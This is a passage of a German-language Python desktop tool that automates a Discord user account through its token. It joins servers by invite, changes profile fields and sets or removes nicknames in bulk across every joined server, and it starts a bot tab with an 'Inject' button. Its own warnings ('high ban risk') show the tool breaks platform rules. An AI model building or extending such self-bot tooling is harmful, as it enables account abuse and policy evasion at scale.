14))\n\n        card_in = ctk.CTkFrame(card, fg_color="transparent")\n        card_in.pack(fill="x", padx=24, pady=24)\n\n        ctk.CTkLabel(card_in, text="Server beitreten per Einladungslink", font=("Segoe UI", 16, "bold"), text_color=C["text"]).pack(anchor="w")\n        ctk.CTkLabel(card_in, text="Gib einen gueltigen Discord Einladungslink oder Invite-Code ein, um dem Server sofort beizutreten.", font=("Segoe UI", 11), text_color=C["text_muted"]).pack(anchor="w", pady=(3, 10))\n\n        # Kleine Warnbox\n        box_warn_join = ctk.CTkFrame(card_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])\n        box_warn_join.pack(fill="x", pady=(0, 14))\n        ctk.CTkLabel(\n            box_warn_join,\n            text="Warnung: Hohe Ban-Gefahr",\n            font=("Segoe UI", 10.5, "bold"),\n            text_color=C["red_text"]\n        ).pack(anchor="w", padx=12, pady=5)\n\n        input_row = ctk.CTkFrame(card_in, fg_color="transparent")\n        input_row.pack(fill="x")\n\n        self.join_input_var = ctk.StringVar()\n        self.entry_join = ctk.CTkEntry(\n            input_row,\n            textvariable=self.join_input_var,\n            placeholder_text="https://discord.gg/... oder Invite-Code",\n            height=40,\n            corner_radius=12,\n            fg_color=C["card_alt"],\n            border_color=C["card_border_hi"],\n            text_color=C["text"]\n        )\n        self.entry_join.pack(side="left", fill="x", expand=True, padx=(0, 10))\n\n        btn_join = ctk.CTkButton(\n            input_row,\n            text="Server beitreten",\n            font=("Segoe UI", 11.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=40,\n            width=160,\n            corner_radius=12,\n            command=self._join_server_by_link\n        )\n        btn_join.pack(side="right")\n\n        # Feedback & Preview Box\n        self.join_status_card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        self.join_status_card.pack(fill="both", expand=True)\n\n        sc_in = ctk.CTkFrame(self.join_status_card, fg_color="transparent")\n        sc_in.pack(fill="both", expand=True, padx=24, pady=24)\n\n        ctk.CTkLabel(sc_in, text="Status & Einladungsdetails", font=("Segoe UI", 14, "bold"), text_color=C["text"]).pack(anchor="w")\n\n        self.lbl_join_info = ctk.CTkLabel(\n            sc_in,\n            text="Bereit zum Beitreten. Fuege oben einen Invite-Link ein und klicke auf \'Server beitreten\'.",\n            font=("Segoe UI", 11.5),\n            text_color=C["text_sub"],\n            justify="left"\n        )\n        self.lbl_join_info.pack(anchor="w", pady=(10, 0))\n\n        self.lbl_join_details = ctk.CTkLabel(\n            sc_in,\n            text="",\n            font=("Consolas", 10.5),\n            text_color=C["text_muted"],\n            justify="left"\n        )\n        self.lbl_join_details.pack(anchor="w", pady=(8, 0))\n\n    def _set_join_status(self, main_text, details="", is_error=False, is_success=False):\n        color = C["red_text"] if is_error else (C["green"] if is_success else C["text_sub"])\n        self.lbl_join_info.configure(text=main_text, text_color=color)\n        self.lbl_join_details.configure(text=details)\n\n    def _join_server_by_link(self):\n        raw_link = self.join_input_var.get().strip()\n        if not raw_link:\n            self._set_join_status("Bitte gib einen Invite-Link oder Code ein.", is_error=True)\n            return\n\n        cleaned = raw_link.replace("https://", "").replace("http://", "").replace("discord.gg/", "").replace("discord.com/invite/", "").strip()\n        code = cleaned.split("/")[0].split("?")[0].strip()\n        if not code:\n            self._set_join_status("Konnte keinen gueltigen Einladungscode erkennen.", is_error=True)\n            return\n\n        self._set_join_status(f"Verarbeite Einladung ({code})...", details="Sende Beitrittsanfrage an Discord API...")\n\n        def _do_join():\n            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:\n                time.sleep(0.4)\n                mock_guild = {"id": "998877665544", "name": f"Community ({code})", "owner": False}\n                self.guilds_data.append(mock_guild)\n                self.after(0, lambda: self._on_join_success(mock_guild.get("name"), mock_guild.get("id"), "Demo-Modus"))\n                return\n\n            try:\n                invite_info = {}\n                r_info = make_discord_api_request("GET", f"https://discord.com/api/v10/invites/{code}?with_counts=true", self.token)\n                if r_info and r_info.status_code == 200:\n                    invite_info = r_info.json()\n\n                res = make_discord_api_request("POST", f"https://discord.com/api/v10/invites/{code}", self.token, json_data={})\n                if res and res.status_code in (200, 204):\n                    res_data = res.json() if res.status_code == 200 else {}\n                    g_info = res_data.get("guild", {}) or invite_info.get("guild", {})\n                    g_name = g_info.get("name", code)\n                    g_id = g_info.get("id", "Unbekannt")\n                    members_cnt = invite_info.get("approximate_member_count", "—")\n\n                    if not any(str(g.get("id")) == str(g_id) for g in self.guilds_data):\n                        self.guilds_data.append({"id": g_id, "name": g_name, "owner": False})\n\n                    details_txt = f"Server Name: {g_name}\\nServer ID:   {g_id}\\nMitglieder:  {members_cnt}"\n                    self.after(0, lambda: self._on_join_success(g_name, g_id, details_txt))\n                elif res and res.status_code == 404:\n                    self.after(0, lambda: self._set_join_status("Einladungscode existiert nicht oder ist abgelaufen.", details=f"Code: {code} (Status 404)", is_error=True))\n                elif res and res.status_code == 429:\n                    self.after(0, lambda: self._set_join_status("Discord Rate-Limit erreicht. Bitte warte kurz.", details="Status 429", is_error=True))\n                else:\n                    err_code = res.status_code if res else "Timeout"\n                    err_txt = res.text[:120] if res else ""\n                    self.after(0, lambda: self._set_join_status(f"Beitreten fehlgeschlagen ({err_code}).", details=err_txt, is_error=True))\n            except Exception as ex:\n                self.after(0, lambda: self._set_join_status("Verbindungsfehler beim Beitreten.", details=str(ex), is_error=True))\n\n        threading.Thread(target=_do_join, daemon=True).start()\n\n    def _on_join_success(self, g_name, g_id, details=""):\n        self._set_join_status(f"Erfolgreich beigetreten: {g_name}", details=f"Server-ID: {g_id}\\n{details}", is_success=True)\n        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})")\n        if hasattr(self, "lbl_guilds_title"):\n            self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})")\n        self._render_all_guilds_cards()\n        self._update_extra_guild_options()\n        self.entry_join.delete(0, "end")\n\n    # --------------------------------------------------------------------------\n    # 6. EXTRA TAB (BIO, NAME, NUTZERNAME, SERVER-TAG RAUSNEHMEN & REINMACHEN)\n    # --------------------------------------------------------------------------\n    def _build_extra_tab(self):\n        scroll = ctk.CTkScrollableFrame(self.frame_extra, fg_color="transparent")\n        scroll.pack(fill="both", expand=True)\n\n        card_prof = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card_prof.pack(fill="x", pady=(0, 14))\n\n        cp_in = ctk.CTkFrame(card_prof, fg_color="transparent")\n        cp_in.pack(fill="x", padx=22, pady=20)\n\n        ctk.CTkLabel(cp_in, text="Profil & Identitaet anpassen", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")\n        ctk.CTkLabel(cp_in, text="Aendere deinen Anzeigenamen, Nutzernamen oder deine Account-Bio direkt ueber das Tool.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))\n\n        # Kleine Warnbox\n        box_warn_prof = ctk.CTkFrame(cp_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])\n        box_warn_prof.pack(fill="x", pady=(0, 14))\n        ctk.CTkLabel(\n            box_warn_prof,\n            text="Warnung: Hohe Ban-Gefahr",\n            font=("Segoe UI", 10.5, "bold"),\n            text_color=C["red_text"]\n        ).pack(anchor="w", padx=12, pady=5)\n\n        # 1. Anzeigename (Global Display Name)\n        row_gn = ctk.CTkFrame(cp_in, fg_color="transparent")\n        row_gn.pack(fill="x", pady=4)\n        ctk.CTkLabel(row_gn, text="Anzeigename:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")\n        self.entry_display_name = ctk.CTkEntry(row_gn, height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])\n        self.entry_display_name.pack(side="left", fill="x", expand=True, padx=(0, 10))\n        curr_gname = self.user_data.get("global_name") or self.user_data.get("username", "")\n        self.entry_display_name.insert(0, curr_gname)\n        btn_save_gn = ctk.CTkButton(\n            row_gn,\n            text="Speichern",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            width=100,\n            height=34,\n            corner_radius=10,\n            command=self._save_display_name\n        )\n        btn_save_gn.pack(side="right")\n\n        # 2. Nutzername (@username) & optionales Passwort\n        row_un = ctk.CTkFrame(cp_in, fg_color="transparent")\n        row_un.pack(fill="x", pady=4)\n        ctk.CTkLabel(row_un, text="Nutzername (@):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")\n        self.entry_username = ctk.CTkEntry(row_un, height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])\n        self.entry_username.pack(side="left", fill="x", expand=True, padx=(0, 8))\n        self.entry_username.insert(0, self.user_data.get("username", ""))\n\n        self.entry_password = ctk.CTkEntry(\n            row_un,\n            placeholder_text="Passwort (falls noetig)",\n            show="*",\n            height=34,\n            width=160,\n            corner_radius=10,\n            fg_color=C["card_alt"],\n            border_color=C["card_border"],\n            text_color=C["text"]\n        )\n        self.entry_password.pack(side="left", padx=(0, 10))\n\n        btn_save_un = ctk.CTkButton(\n            row_un,\n            text="Speichern",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            width=100,\n            height=34,\n            corner_radius=10,\n            command=self._save_username\n        )\n        btn_save_un.pack(side="right")\n\n        # 3. Bio (Ueber mich)\n        ctk.CTkLabel(cp_in, text="Bio (Ueber mich):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(anchor="w", pady=(8, 4))\n        self.txt_bio = ctk.CTkTextbox(\n            cp_in,\n            height=70,\n            corner_radius=10,\n            fg_color=C["card_alt"],\n            border_color=C["card_border"],\n            border_width=1,\n            text_color=C["text"],\n            font=("Segoe UI", 10.5)\n        )\n        self.txt_bio.pack(fill="x", pady=(0, 8))\n        curr_bio = self.user_data.get("bio", "")\n        if curr_bio:\n            self.txt_bio.insert("1.0", curr_bio)\n\n        row_bio_btns = ctk.CTkFrame(cp_in, fg_color="transparent")\n        row_bio_btns.pack(fill="x")\n\n        btn_save_bio = ctk.CTkButton(\n            row_bio_btns,\n            text="Bio speichern",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=32,\n            width=120,\n            corner_radius=10,\n            command=self._save_bio\n        )\n        btn_save_bio.pack(side="left", padx=(0, 8))\n\n        btn_clear_bio = ctk.CTkButton(\n            row_bio_btns,\n            text="Bio leeren",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            height=32,\n            width=100,\n            corner_radius=10,\n            command=self._clear_bio\n        )\n        btn_clear_bio.pack(side="left")\n\n        # ---------------- KARTE 2: SERVER-TAG & SPITZNAME ----------------\n        card_tag = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card_tag.pack(fill="x", pady=(0, 14))\n\n        ct_in = ctk.CTkFrame(card_tag, fg_color="transparent")\n        ct_in.pack(fill="x", padx=22, pady=20)\n\n        ctk.CTkLabel(ct_in, text="Server-Tag & Spitzname verwalten", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")\n        ctk.CTkLabel(ct_in, text="Setze einen neuen Server-Tag / Nickname oder nimm deinen Server-Tag auf einzelnen oder allen Servern restlos raus.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))\n\n        # Kleine Warnbox\n        box_warn_tag = ctk.CTkFrame(ct_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])\n        box_warn_tag.pack(fill="x", pady=(0, 14))\n        ctk.CTkLabel(\n            box_warn_tag,\n            text="Warnung: Hohe Ban-Gefahr",\n            font=("Segoe UI", 10.5, "bold"),\n            text_color=C["red_text"]\n        ).pack(anchor="w", padx=12, pady=5)\n\n        # Server Auswahl Dropdown\n        row_srv = ctk.CTkFrame(ct_in, fg_color="transparent")\n        row_srv.pack(fill="x", pady=4)\n        ctk.CTkLabel(row_srv, text="Ziel-Server:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")\n\n        self.server_options = self._get_server_dropdown_list()\n        self.server_tag_target_var = ctk.StringVar(value=self.server_options[0] if self.server_options else "Keine Server")\n        self.opt_server_select = ctk.CTkOptionMenu(\n            row_srv,\n            values=self.server_options,\n            variable=self.server_tag_target_var,\n            height=34,\n            corner_radius=10,\n            fg_color=C["card_alt"],\n            button_color=C["card_border_hi"],\n            button_hover_color=C["card_hover"],\n            text_color=C["text"]\n        )\n        self.opt_server_select.pack(side="left", fill="x", expand=True)\n\n        row_tag_input = ctk.CTkFrame(ct_in, fg_color="transparent")\n        row_tag_input.pack(fill="x", pady=8)\n        ctk.CTkLabel(row_tag_input, text="Neuer Server-Tag:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")\n        self.entry_server_tag = ctk.CTkEntry(\n            row_tag_input,\n            placeholder_text="z.B. [NIGHT] oder eigener Tag (leer lassen zum Rausnehmen)",\n            height=34,\n            corner_radius=10,\n            fg_color=C["card_alt"],\n            border_color=C["card_border"],\n            text_color=C["text"]\n        )\n        self.entry_server_tag.pack(side="left", fill="x", expand=True)\n\n        row_tag_btns = ctk.CTkFrame(ct_in, fg_color="transparent")\n        row_tag_btns.pack(fill="x", pady=(4, 0))\n\n        btn_set_tag = ctk.CTkButton(\n            row_tag_btns,\n            text="Server-Tag setzen",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=34,\n            width=150,\n            corner_radius=10,\n            command=self._apply_server_tag\n        )\n        btn_set_tag.pack(side="left", padx=(0, 8))\n\n        btn_remove_tag = ctk.CTkButton(\n            row_tag_btns,\n            text="Server-Tag rausnehmen",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            height=34,\n            width=175,\n            corner_radius=10,\n            command=self._remove_server_tag\n        )\n        btn_remove_tag.pack(side="left", padx=(0, 8))\n\n        btn_remove_clan = ctk.CTkButton(\n            row_tag_btns,\n            text="Clan-Tag entfernen",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=34,\n            width=150,\n            corner_radius=10,\n            command=self._remove_clan_tag\n        )\n        btn_remove_clan.pack(side="left", padx=(0, 8))\n\n        self.btn_stop_extra = ctk.CTkButton(\n            row_tag_btns,\n            text="Stop",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["btn_gray"],\n            text_color=C["text_muted"],\n            hover_color=C["red_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=34,\n            width=65,\n            corner_radius=10,\n            state="disabled",\n            command=self._stop_extra_operation\n        )\n        self.btn_stop_extra.pack(side="right")\n\n        # ---------------- KARTE 3: STATUS & RUECKMELDUNG ----------------\n        card_st = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card_st.pack(fill="x", pady=(0, 10))\n\n        cs_in = ctk.CTkFrame(card_st, fg_color="transparent")\n        cs_in.pack(fill="x", padx=22, pady=16)\n\n        ctk.CTkLabel(cs_in, text="Status & Rueckmeldung", font=("Segoe UI", 13, "bold"), text_color=C["text"]).pack(anchor="w")\n\n        self.lbl_extra_status = ctk.CTkLabel(cs_in, text="Bereit fuer Aenderungen.", font=("Segoe UI", 11), text_color=C["text_sub"], justify="left")\n        self.lbl_extra_status.pack(anchor="w", pady=(6, 2))\n\n        self.lbl_extra_details = ctk.CTkLabel(cs_in, text="", font=("Consolas", 10), text_color=C["text_muted"], justify="left")\n        self.lbl_extra_details.pack(anchor="w")\n\n    def _get_server_dropdown_list(self):\n        opts = ["Auf allen Servern gleichzeitig"]\n        for g in self.guilds_data:\n            gname = g.get("name", "Server")\n            gid = str(g.get("id", ""))\n            opts.append(f"{gname} ({gid})")\n        return opts\n\n    def _update_extra_guild_options(self):\n        if hasattr(self, "opt_server_select"):\n            opts = self._get_server_dropdown_list()\n            self.opt_server_select.configure(values=opts)\n            if self.server_tag_target_var.get() not in opts:\n                self.server_tag_target_var.set(opts[0] if opts else "Keine Server")\n\n    def _set_extra_status(self, main_text, details="", is_error=False, is_success=False):\n        color = C["red_text"] if is_error else (C["green"] if is_success else C["text_sub"])\n        self.after(0, lambda: [\n            self.lbl_extra_status.configure(text=main_text, text_color=color),\n            self.lbl_extra_details.configure(text=details)\n        ])\n\n    def _save_display_name(self):\n        new_name = self.entry_display_name.get().strip()\n        if not new_name:\n            self._set_extra_status("Bitte einen Anzeigenamen eingeben.", is_error=True)\n            return\n\n        self._set_extra_status(f"Speichere Anzeigenamen \'{new_name}\'...", details="Sende Anfrage an Discord API...")\n\n        def _worker():\n            if not self.token or "DEMO" in self.token:\n                self.user_data["global_name"] = new_name\n                self.after(0, lambda: [\n                    self.lbl_sidebar_name.configure(text=new_name[:17]),\n                    self.lbl_hero_title.configure(text=new_name)\n                ])\n                self._set_extra_status(f"Anzeigename erfolgreich auf \'{new_name}\' gesetzt.", details="Aenderung uebernommen.", is_success=True)\n                return\n\n            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data={"global_name": new_name})\n            if res and res.status_code == 200:\n                self.user_data["global_name"] = new_name\n                self.after(0, lambda: [\n                    self.lbl_sidebar_name.configure(text=new_name[:17]),\n                    self.lbl_hero_title.configure(text=new_name)\n                ])\n                self._set_extra_status(f"Anzeigename erfolgreich auf \'{new_name}\' gesetzt.", details="Live in Discord aktualisiert.", is_success=True)\n            else:\n                err_code = res.status_code if res else "Timeout"\n                err_txt = res.text[:120] if res else ""\n                self._set_extra_status(f"Fehler beim Aendern des Anzeigenamens ({err_code}).", details=err_txt, is_error=True)\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _save_username(self):\n        new_uname = self.entry_username.get().strip()\n        pw = self.entry_password.get().strip()\n        if not new_uname:\n            self._set_extra_status("Bitte einen Nutzernamen eingeben.", is_error=True)\n            return\n\n        self._set_extra_status(f"Speichere Nutzername \'@{new_uname}\'...", details="Sende Anfrage an Discord API...")\n\n        def _worker():\n            if not self.token or "DEMO" in self.token:\n                self.user_data["username"] = new_uname\n                uid = str(self.user_data.get("id", "-"))\n                self.after(0, lambda: self.lbl_hero_sub.configure(text=f"@{new_uname}  |  ID: {uid}"))\n                self._set_extra_status(f"Nutzername erfolgreich zu \'@{new_uname}\' geaendert.", details="Aenderung uebernommen.", is_success=True)\n                return\n\n            payload = {"username": new_uname}\n            if pw:\n                payload["password"] = pw\n\n            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data=payload)\n            if res and res.status_code == 200:\n                self.user_data["username"] = new_uname\n                uid = str(self.user_data.get("id", "-"))\n                self.after(0, lambda: self.lbl_hero_sub.configure(text=f"@{new_uname}  |  ID: {uid}"))\n                self._set_extra_status(f"Nutzername erfolgreich zu \'@{new_uname}\' geaendert.", details="Live in Discord aktualisiert.", is_success=True)\n            else:\n                err_code = res.status_code if res else "Timeout"\n                err_txt = res.text[:150] if res else ""\n                hint = "Discord verlangt ein Passwort zur Bestaetigung." if "password" in err_txt.lower() else err_txt\n                self._set_extra_status(f"Fehler beim Aendern des Nutzernamens ({err_code}).", details=hint, is_error=True)\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _save_bio(self):\n        new_bio = self.txt_bio.get("1.0", "end-1c").strip()\n        self._set_extra_status("Speichere Bio...", details="Sende Anfrage an Discord API...")\n\n        def _worker():\n            if not self.token or "DEMO" in self.token:\n                self.user_data["bio"] = new_bio\n                self.after(0, lambda: self.lbl_hero_bio.configure(text=new_bio[:110] or "Keine Bio hinterlegt."))\n                self._set_extra_status("Bio erfolgreich aktualisiert.", details="Aenderung uebernommen.", is_success=True)\n                return\n\n            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data={"bio": new_bio})\n            if not res or res.status_code != 200:\n                res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me/profile", self.token, json_data={"bio": new_bio})\n\n            if res and res.status_code == 200:\n                self.user_data["bio"] = new_bio\n                self.after(0, lambda: self.lbl_hero_bio.configure(text=new_bio[:110] or "Keine Bio hinterlegt."))\n                self._set_extra_status("Bio erfolgreich aktualisiert.", details="Live in Discord uebernommen.", is_success=True)\n            else:\n                err_code = res.status_code if res else "Timeout"\n                err_txt = res.text[:120] if res else ""\n                self._set_extra_status(f"Fehler beim Speichern der Bio ({err_code}).", details=err_txt, is_error=True)\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _clear_bio(self):\n        self.txt_bio.delete("1.0", "end")\n        self._save_bio()\n\n    def _apply_server_tag(self):\n        new_tag = self.entry_server_tag.get().strip()\n        target = self.server_tag_target_var.get()\n        if not new_tag:\n            self._set_extra_status("Bitte gib einen Server-Tag oder Spitznamen ein (z.B. [NIGHT]).", is_error=True)\n            return\n        self._execute_server_tag_change(new_tag, target, remove=False)\n\n    def _remove_server_tag(self):\n        target = self.server_tag_target_var.get()\n        self._execute_server_tag_change(None, target, remove=True)\n\n    def _remove_clan_tag(self):\n        self._set_extra_status("Entferne Clan / Server-Tag Badge...", details="Sende Reset-Anfrage...")\n\n        def _worker():\n            if not self.token or "DEMO" in self.token:\n                self._set_extra_status("Clan Server-Tag Badge erfolgreich entfernt.", details="Demo-Modus.", is_success=True)\n                return\n\n            r1 = make_discord_api_request("PUT", "https://discord.com/api/v10/users/@me/clan", self.token, json_data={"identity_guild_id": None})\n            r2 = make_discord_api_request("DELETE", "https://discord.com/api/v10/users/@me/clan", self.token)\n            if (r1 and r1.status_code in (200, 204)) or (r2 and r2.status_code in (200, 204)):\n                self._set_extra_status("Clan Server-Tag Badge erfolgreich entfernt.", details="Badge zurueckgesetzt.", is_success=True)\n            else:\n                self._set_extra_status("Clan-Tag wurde entfernt oder war nicht aktiv.", details="Befehl ausgefuehrt.", is_success=True)\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _stop_extra_operation(self):\n        self.extra_stop_requested = True\n        if hasattr(self, "btn_stop_extra"):\n            self.btn_stop_extra.configure(text="Stoppe...", state="disabled")\n\n    def _execute_server_tag_change(self, tag_val, target_str, remove=False):\n        if self.extra_in_progress:\n            return\n\n        self.extra_in_progress = True\n        self.extra_stop_requested = False\n\n        if hasattr(self, "btn_stop_extra"):\n            self.btn_stop_extra.configure(\n                state="normal",\n                fg_color=C["red_bg"],\n                text_color=C["red_text"],\n                border_color=C["red_border"],\n                text="Stop"\n            )\n\n        action_desc = "Entferne Server-Tag..." if remove else f"Setze Server-Tag \'{tag_val}\'..."\n        self._set_extra_status(action_desc, details=f"Ziel: {target_str}")\n\n        def _worker():\n            if target_str == "Auf allen Servern gleichzeitig":\n                guild_list = list(self.guilds_data)\n            else:\n                gid_match = None\n                if "(" in target_str and ")" in target_str:\n                    gid_match = target_str.split("(")[-1].split(")")[0].strip()\n                guild_list = [g for g in self.guilds_data if str(g.get("id")) == str(gid_match)]\n\n            if not guild_list:\n                self._set_extra_status("Keine gueltigen Server gefunden.", is_error=True)\n                self.extra_in_progress = False\n                self.after(0, lambda: self._on_extra_finished())\n                return\n\n            success_cnt = 0\n            fail_cnt = 0\n            payload = {"nick": None if remove else tag_val}\n\n            for idx, g in enumerate(guild_list):\n                if self.extra_stop_requested:\n                    break\n\n                gid = str(g.get("id"))\n                gname = g.get("name", "Server")\n                self._set_extra_status(f"{action_desc} ({idx+1}/{len(guild_list)})", details=f"Aktuell: {gname}")\n\n                if not self.token or "DEMO" in self.token:\n                    time.sleep(0.05)\n                    success_cnt += 1\n                else:\n                    r = make_discord_api_request("PATCH", f"https://discord.com/api/v10/guilds/{gid}/members/@me", self.token, json_data=payload)\n                    if not r or r.status_code not in (200, 204):\n                        r = make_discord_api_request("PATCH", f"https://discord.com/api/v10/users/@me/guilds/{gid}/member", self.token, json_data=payload)\n\n                    if r and r.status_code in (200, 204):\n                        success_cnt += 1\n                    else:\n                        fail_cnt += 1\n\n                    for _ in range(5):\n                        if self.extra_stop_requested:\n                            break\n                        time.sleep(0.04)\n\n            self.extra_in_progress = False\n            self.extra_stop_requested = False\n\n            if remove:\n                done_msg = f"Server-Tag erfolgreich entfernt auf {success_cnt} Servern."\n            else:\n                done_msg = f"Server-Tag \'{tag_val}\' erfolgreich gesetzt auf {success_cnt} Servern."\n\n            det_msg = f"Erfolgreich: {success_cnt} | Fehlgeschlagen/Keine Rechte: {fail_cnt}"\n            self._set_extra_status(done_msg, details=det_msg, is_success=(success_cnt > 0))\n            self.after(0, lambda: self._on_extra_finished())\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _on_extra_finished(self):\n        if hasattr(self, "btn_stop_extra"):\n            self.btn_stop_extra.configure(\n                state="disabled",\n                fg_color=C["btn_gray"],\n                text_color=C["text_muted"],\n                border_color=C["card_border_hi"],\n                text="Stop"\n            )\n\n    # --------------------------------------------------------------------------\n    # 7. BOT TAB (MIT BUTTON "BOT", IN-TAB LOADER, RELOAD, DEACTIVATE, INJECT,\n    #             MESSAGE SENDER FUER SERVER/DMS & LIVE RATE-LIMIT MONITOR)\n    # --------------------------------------------------------------------------\n    def _build_bot_tab(self):\n        scroll = ctk.CTkScrollableFrame(self.frame_bot, fg_color="transparent")\n        scroll.pack(fill="both", expand=True)\n\n        # 1. BOT STEUERUNG CARD\n        card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card.pack(fill="x", pady=(0, 14))\n\n        cin = ctk.CTkFrame(card, fg_color="transparent")\n        cin.pack(fill="x", padx=22, pady=20)\n\n        top_row = ctk.CTkFrame(cin, fg_color="transparent")\n        top_row.pack(fill="x")\n\n        ctk.CTkLabel(top_row, text="Bot Steuerung & Engine", font=("Segoe UI", 16, "bold"), text_color=C["text"]).pack(side="left")\n\n        self.lbl_bot_status_badge = ctk.CTkLabel(\n            top_row,\n            text="INAKTIV",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["card_alt"],\n            text_color=C["text_muted"],\n            corner_radius=8,\n            padx=10,\n            pady=3\n        )\n        self.lbl_bot_status_badge.pack(side="right")\n\n        ctk.CTkLabel(\n            cin,\n            text="Aktiviere den Bot-Modus. Bei Aktivierung schliessen sich alle anderen Tabs, das Tool laedt mit Token neu.",\n            font=("Segoe UI", 11),\n            text_color=C["text_muted"]\n        ).pack(anchor="w", pady=(2, 16))\n\n        # BUTTONS ROW (Bot, Deactivate, Inject, Click Instant)\n        btn_row = ctk.CTkFrame(cin, fg_color="transparent")\n        btn_row.pack(fill="x", pady=(0, 10))\n\n        self.btn_bot_start = ctk.CTkButton(\n            btn_row,\n            text="Bot",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=38,\n            width=130,\n            corner_radius=12,\n            command=self._start_bot_loader_and_reload\n        )\n        self.btn_bot_start.pack(side="left", padx=(0, 8))\n\n        self.btn_bot_deact = ctk.CTkButton(\n            btn_row,\n            text="Deactivate",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            height=38,\n            width=120,\n            corner_radius=12,\n            state="disabled",\n            command=self._on_click_deactivate\n        )\n        self.btn_bot_deact.pack(side="left", padx=(0, 8))\n\n        self.btn_bot_inject = ctk.CTkButton(\n            btn_row,\n            text="Inject",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=38,\n            width=110,\n            corner_radius=12,\n            command=self._on_click_inject\n        )\n        self.btn_bot_inject.pack(side="left", padx=(0, 8))\n\n        self.btn_bot_click_ext = ctk.CTkButton(\n            btn_row,\n            text="Click Instant (Extern)",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=38,\n            width=170,\n            corner_radius=12,\n            command=self.open_external_click_instant_window\n        )\n        self.btn_bot_click_ext.pack(side="left")\n\n        # IN-TAB LOADER BOX\n        self.bot_loader_frame = ctk.CTkFrame(cin, fg_color=C["card_alt"], corner_radius=12, border_width=1, border_color=C["card_border"])\n\n        bl_inner = ctk.CTkFrame(self.bot_loader_frame, fg_color="transparent")\n        bl_inner.pack(fill="x", padx=16, pady=14)\n\n        self.lbl_bot_loader_title = ctk.CTkLabel(bl_inner, text="Bot Engine Synchronisation", font=("Segoe UI", 12, "bold"), text_color=C["text"])\n        self.lbl_bot_loader_title.pack(anchor="w")\n\n        self.bot_progress = ctk.CTkProgressBar(bl_inner, height=8, corner_radius=4, fg_color=C["card"], progress_color=C["blurple"])\n        